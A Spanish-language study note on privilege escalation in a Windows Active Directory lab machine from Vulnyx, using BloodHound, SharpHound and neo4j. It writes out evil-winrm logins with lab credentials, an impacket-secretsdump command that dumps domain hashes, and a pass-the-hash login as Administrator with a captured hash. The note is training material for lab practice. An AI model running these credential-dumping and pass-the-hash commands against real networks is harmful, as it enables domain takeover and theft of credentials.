- Tags: #window #window_escalada_privilegios #tool_bloodhound #tool_sharphound #tool_neo4j #recursos #recursos_vulnyx #window_dc #active_directory #pass_the_hash 

**Recurso**: Maquina Controler vulnyx

Estas son herramientas que se utilizan en el proceso de escalada de privilegios por lo que es necesario ya haber ejecutado la intrusión al sistema y contar con credenciales y usuarios validos

La herramienta *bloodhound* se utiliza en conjunto con una base de datos llamada *neo4j*,  *bloodhound*  nos otorga un archivo .zip el cual importamos en *neo4j* .

En la maquina del recurso se entra por winrm con el user  *'j.levy'* pass *'Password1'* cabe destacar que se entra por winrm ya que el usuario es parte del grupo *Remote Management Use*

Comando utilizado para ver los privilegios con los que cuenta el usuario con el que se realizo la intrusion *whoami /priv* 

**Tools**:
*sharphound*: Recolector de información del dominio en .zip [https://github.com/SpecterOps/SharpHound](https://github.com/SpecterOps/SharpHound)
*neo4f*: Base de datos para almacenar la información
*bloodhound*: Visualizador de la información del dominio en forma gráfica


*sharphound*: Nos descargamos el .exe en una carpeta espacifica para establecer la conexión de *evil-winrm* desde esta para poder subir el *sharphound.exe* a la maquina victima. Desde *evil-winrm*  ya conectado al objetivo hacemos un 
```bash
upload SharpHound.exe

./SharpHound.exe

#Dejamos que recopile informacion y nos descargamos el .zip que este genera

download nombre_file.zip
```

Próximo paso es configurar la BD de Neo4j 
```bash
apt install -y neo4j bloodhound

sudo neo4j console #creamos la BD

#Configuramos el user de neo4j en la web que activa

#Luego nos habrimos bloodhound y nos conectamos a neo4j y le subimos el archivo.zip que descargamos de la maquina objetivo
```


Paso a paso visual de la configuración de *neo4j* y conexión *bloodhound*

![](../../../../attachments/Pasted%20image%2020260214053725.png)

![](../../../../attachments/Pasted%20image%2020260214054242.png)

![](../../../../attachments/Pasted%20image%2020260214054415.png)

![](../../../../attachments/Pasted%20image%2020260214054543.png)

![](../../../../attachments/Pasted%20image%2020260214054700.png)

![](../../../../attachments/Pasted%20image%2020260214054912.png)

![](../../../../attachments/Pasted%20image%2020260214055159.png)

![](../../../../attachments/Pasted%20image%2020260214055501.png)

![](../../../../attachments/Pasted%20image%2020260214060130.png)

![](../../../../attachments/Pasted%20image%2020260214060443.png)

**Muy Importante en entornos de Directorio Activo siempre en nuestro /etc/hosts debemos agregar el dominio para que responda al ip** 

```bash
172.19.122.91   control.nyx 
```

Y procedemos a explotarla con *secretsdump*  ademas nos informa de que esta pertenece a la Liberia de *impacket*  por lo que nos da mucha info de como explotar la vulnerabilidad para obtener mas info de los usuarios del dominio
```bash 
impacket-secretsdump 'control.nyx/j.levy':'Password1'@'control.nix' 
```


![](../../../../attachments/Pasted%20image%2020260214061438.png)

Con esta hash de admin capturado podemos ejecutar un *pass the hash*
```bash
evil-winrm -i domain -u 'Administrator' -H 'hash_capturado'

evil-winrm -i control.nyx -u 'Administrator' -H '48b20d4f3ea31b7234c92b71c90fbff7'

```